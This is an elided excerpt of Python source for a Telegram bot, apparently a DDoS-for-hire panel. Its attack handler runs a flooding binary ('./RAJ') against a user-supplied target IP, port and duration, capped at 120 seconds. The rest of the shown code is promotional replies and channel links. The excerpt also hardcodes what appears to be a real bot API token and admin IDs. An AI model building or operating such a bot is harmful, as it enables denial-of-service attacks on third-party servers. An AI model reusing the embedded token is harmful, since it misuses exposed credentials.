...
bot = telebot.TeleBot('7780895680:AAEFgq0-Nc50dQCxtyHIUwwqDRnSmb8f3fc')
# DEVELOPER --> @LostBoiXD
# Admin user IDs
admin_id = ["7841947876"]
...
def handle_attack(message):
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:
            ...
            if attack_time > 120:
                bot.reply_to(message, "⛔ Maximum time allowed is 120 seconds.")
                return
            ...
            full_command = f"./RAJ {target} {port} {attack_time} 900"
...
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"𝐂A𝐍𝐀𝐑𝐘 𝐀𝐏𝐊 --> https://t.me/HEADSHOTxSHIVA"
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['LAST'])
def show_help(message):
    response = """𝐈 𝐊𝐍𝐎𝐖 𝐘𝐎𝐔 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 𝐈𝐒 - Lost \n𝐁𝐔𝐓 𝐇𝐈𝐒 𝐁𝐎𝐓𝐒 𝐅𝐀𝐓𝐇𝐄𝐑 @HEADSHOTxSHIVA \n𝐎𝐖𝐍𝐄𝐑 𝐎𝐅  @HEADSHOTxSHIVAxBOT.
"""
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.row(
        telebot.types.InlineKeyboardButton('Updates', url='@HEADSHOTxSHIVA')
    )
